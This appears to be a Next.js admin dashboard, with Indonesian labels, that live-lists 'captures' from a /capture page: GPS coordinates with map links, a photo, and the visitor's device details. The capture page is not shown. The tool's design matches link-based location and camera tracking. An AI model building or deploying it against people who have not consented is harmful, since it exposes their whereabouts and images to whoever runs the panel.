'use client'

import { useEffect, useState } from 'react'

type Capture = {
  id: string
  createdAt: string
  latitude: number | null
  longitude: number | null
  accuracy: number | null
  photo: string | null
  userAgent: string | null
}

export default function AdminPage() {
  const [captures, setCaptures] = useState<Capture[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  async function fetchData() {
    setLoading(true)
    setError(null)
    try {
      const res = await fetch('/api/captures')
      if (!res.ok) throw new Error('Gagal mengambil data')
      const data = await res.json()
      setCaptures(data)
    } catch (e) {
      setError('Gagal koneksi ke server')
    }
    setLoading(false)
  }

  // Auto refresh setiap 5 detik
  useEffect(() => {
    fetchData()
    const interval = setInterval(fetchData, 5000)
    return () => clearInterval(interval)
  }, [])

  async function handleDelete(id: string) {
  if (!confirm('Yakin mau hapus data ini?')) return

  try {
    const res = await fetch(`/api/captures/${id}`, {
      method: 'DELETE',
    })
    if (res.ok) {
      setCaptures(prev => prev.filter(c => c.id !== id))
    } else {
      alert('Gagal menghapus!')
    }
  } catch (e) {
    alert('Error koneksi!')
  }
}

  return (
    <main className="min-h-screen bg-gray-950 text-white p-6">
      <div className="max-w-4xl mx-auto space-y-6">

        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold">🖥️ Admin Panel</h1>
            <p className="text-gray-400 text-sm mt-1">
              Auto refresh setiap 5 detik
            </p>
          </div>
          <button
            onClick={fetchData}
            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-sm font-medium transition"
          >
            🔄 Refresh
          </button>
        </div>

        {/* Stats */}
        <div className="bg-gray-800 rounded-xl p-4 flex gap-6">
          <div>
            <p className="text-gray-400 text-sm">Total Data</p>
            <p className="text-3xl font-bold">{captures.length}</p>
          </div>
          <div>
            <p className="text-gray-400 text-sm">Dengan Foto</p>
            <p className="text-3xl font-bold">
              {captures.filter(c => c.photo).length}
            </p>
          </div>
          <div>
            <p className="text-gray-400 text-sm">Dengan Lokasi</p>
            <p className="text-3xl font-bold">
              {captures.filter(c => c.latitude).length}
            </p>
          </div>
        </div>

        {/* Loading */}
        {loading && captures.length === 0 && (
          <div className="text-center text-gray-400 py-12">
            Memuat data...
          </div>
        )}

        {/* Error */}
        {error && (
          <div className="bg-red-900 rounded-xl p-4 text-red-300">
            ❌ {error}
          </div>
        )}

        {/* Kosong */}
        {!loading && captures.length === 0 && !error && (
          <div className="text-center text-gray-400 py-12">
            <p className="text-4xl mb-3">📭</p>
            <p>Belum ada data masuk.</p>
            <p className="text-sm mt-1">Buka halaman /capture di HP kamu.</p>
          </div>
        )}

        {/* List data */}
        <div className="space-y-4">
          {captures.map((c, i) => (
            <div key={c.id} className="bg-gray-800 rounded-xl p-4 space-y-3">

              {/* Header card */}
<div className="flex items-center justify-between">
  <span className="text-sm font-semibold text-blue-400">
    #{captures.length - i} — {new Date(c.createdAt).toLocaleString('id-ID')}
  </span>
  <div className="flex items-center gap-2">
    <span className="text-xs text-gray-500 font-mono">{c.id.slice(0, 8)}...</span>
    <button
      onClick={() => handleDelete(c.id)}
      className="px-2 py-1 bg-red-700 hover:bg-red-600 rounded-lg text-xs transition"
    >
      🗑️ Hapus
    </button>
  </div>
</div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

                {/* Lokasi */}
                <div className="space-y-2">
                  <p className="text-sm font-medium text-gray-300">📍 Lokasi</p>
                  {c.latitude && c.longitude ? (
                    <div className="space-y-1 text-sm">
                      <p>
                        <span className="text-gray-400">Lat: </span>
                        <span className="font-mono">{c.latitude.toFixed(6)}</span>
                      </p>
                      <p>
                        <span className="text-gray-400">Lng: </span>
                        <span className="font-mono">{c.longitude.toFixed(6)}</span>
                      </p>
                      <p>
                        <span className="text-gray-400">Akurasi: </span>
                        <span className="font-mono">±{c.accuracy?.toFixed(0)}m</span>
                      </p>
                      
                      <a
                        href={`https://maps.google.com/?q=${c.latitude},${c.longitude}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-block mt-1 px-3 py-1 bg-green-700 hover:bg-green-600 rounded-lg text-xs transition"
                        >
                        🗺️ Buka di Google Maps
                      </a>
                    </div>
                  ) : (
                    <p className="text-gray-500 text-sm">Tidak ada data lokasi</p>
                  )}

                  {/* User agent */}
                  <div className="mt-3">
                    <p className="text-sm font-medium text-gray-300">📱 Perangkat</p>
                    <p className="text-xs text-gray-500 mt-1 break-all">
                      {c.userAgent ?? '-'}
                    </p>
                  </div>
                </div>

                {/* Foto */}
                <div>
                  <p className="text-sm font-medium text-gray-300 mb-2">📸 Foto</p>
                  {c.photo ? (
                    <img
                      src={c.photo}
                      alt="capture"
                      className="w-full rounded-lg object-cover max-h-48"
                    />
                  ) : (
                    <div className="w-full h-32 bg-gray-700 rounded-lg flex items-center justify-center text-gray-500 text-sm">
                      Tidak ada foto
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </main>
  )
}